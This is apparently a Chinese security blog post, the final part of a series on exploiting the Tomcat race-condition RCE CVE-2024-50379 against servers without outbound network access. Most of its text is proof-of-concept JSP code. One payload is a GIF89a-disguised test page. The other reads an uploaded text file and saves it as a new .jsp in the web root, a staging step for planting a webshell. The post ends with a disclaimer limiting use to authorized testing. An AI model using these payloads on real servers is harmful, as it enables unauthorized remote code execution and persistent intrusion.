#  最终章 | Tomcat条件竞争RCE的最终利用篇，带视频教学及POC   
原创 犀利猪  犀利猪安全   2024-12-21 09:28  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw163nH6MUINlAAdNibz6iaI4IzyrdKvVSZibcTh4HYuZdYIfb8qc2V0Ij92eaVBlDUY5H7rtIfgnYZzh6A/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw163l3X1DTic0xNUMlqqNWbyjzMCSQBL5TSYMicqiaebusTIMaEibNDp0S0ST543taeeM9Blvydoa0pk0uA/640?wx_fmt=png "")  
  
**0x01 文章背景**  
  
    之前我们分别发布了两篇文章，分别是Tomcat条件竞争RCE的复现、以及一篇如何让它持久的利用：  
  
[Tomcat RCE | CVE-2024-50379条件竞争RCE复现，带视频教程及POC](https://mp.weixin.qq.com/s?__biz=Mzk0NzQxNzY2OQ==&mid=2247487499&idx=1&sn=54c62641c62f93cdf13a14f22231801f&scene=21#wechat_redirect)  
  
  
  
[书接上回 | Tomcat条件竞争RCE该如何深入利用，让它持久而并非昙花一现](https://mp.weixin.qq.com/s?__biz=Mzk0NzQxNzY2OQ==&mid=2247487591&idx=1&sn=14d76d32e7522965b528f556598772e4&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw1604HL3RYrePiaXV0fIKC5JibHgdxc68SoBiaIZ2VlyQlwv21H5Ra8WF0jfUCY1znOjFKuGo7nhjqs6Qw/640?wx_fmt=png&from=appmsg "")  
  
    这个洞局限还是比较大的：首先就是需要在Windows上，在漏洞版本范围内，然后开了PUT请求，其次再利用到条件竞争进行上传。  
  
    但是有些东西，你懂的，不可能完全没人开启的，研究它，就是为了在遇到这个漏洞时更好的进行利用：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw1604HL3RYrePiaXV0fIKC5JibHjL1VDJSGahzUme0yF584jaHTlMgeOZ8F8DtTF2JeNGwzibR7eiaIPhLw/640?wx_fmt=png&from=appmsg "")  
  
    第二篇文章，咱们已经描述了这个条件竞争漏洞的利用条件，并提供了一个远程下载的方案，但是这个方案还是有一个问题：  
如果目标不出网，无法进行远程下载，所以咱们总结了一个最终利用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw1604HL3RYrePiaXV0fIKC5JibHCYWAkkKsA0xcYCPRaMqNH1rn3Y9XmXNdjxicOZ1Y8FlQywibXBgErgQQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw163l3X1DTic0xNUMlqqNWbyjzMCSQBL5TSYMicqiaebusTIMaEibNDp0S0ST543taeeM9Blvydoa0pk0uA/640?wx_fmt=png "")  
  
**0x02 直奔教程**  
  
    手好冷，不想打字了，直接看视频吧：  
  
  
**POC如下**  
  
****获取时间：  
```
GIF89a
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.util.Date"%>
<%@ page language="java" contentType="text/html; UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>java_bean</title>
</head>
<body>
  
    <%
        Date date = new Date();   
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM--dd HH:mm:ss"); 
        String today = df.format(date); 
    %>
    当前时间:<%= today%>
</body>
</html>
```  
  
    读取重命名并保存：****  
```
<%@ page import="java.io.*" %>
<%
    //要读取的文件
    String sourceFilePath = application.getRealPath("/") + "xlz1.txt"; 
//重新保存后的文件名
    String destinationFilePath = application.getRealPath("/") + "time123.jsp"; 

    try {

        FileReader fileReader = new FileReader(sourceFilePath);
        BufferedReader bufferedReader = new BufferedReader(fileReader);

        FileWriter fileWriter = new FileWriter(destinationFilePath);
        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

        String line;
        while ((line = bufferedReader.readLine()) != null) {
            bufferedWriter.write(line);
            bufferedWriter.newLine();  
        }
        bufferedReader.close();
        bufferedWriter.close();
        out.println("SAVA_PATH: " + destinationFilePath);
    } catch (IOException e) {
        e.printStackTrace();
        out.println("Error: " + e.getMessage());
    }
%>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/PVHs7dHw163nH6MUINlAAdNibz6iaI4Izy4LuoZ7bquVOTMR71nU9KdboYQl4xoGMXguo4X7ojBz8EgZn7RuRYMw/640?wx_fmt=gif "")  
  
(  
  
**END**  
  
)  
  
  
  
  
**！扫码添加哦！**  
  
**联系进群即可，群内可交流技术**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PVHs7dHw161SVECqIIflnQVpMTR7hvQAZK7QuDt16f1GLXXstw8TpKFkfPNzWqYJwBsNq9w2np08rf2Daia88aA/640?wx_fmt=png "")  
  
**免责声明**  
  
  
  
  
  
  
  
  
     
  
**文章**  
**内容仅限授权测试或学习使用**  
  
**请勿进行非法的测试或攻击******  
  
    利用本账号所发文章**进行直接或间接的非法行为**均由操作者本人负全责**犀利猪安全及文章对应作者**  
  
**不为此承担任何责任**  
  
**文章来自互联网或原创**  
  
**如有侵权可联系我方进行删除**  
  
**并诚挚的跟您说声抱歉**  
  
  
  
  
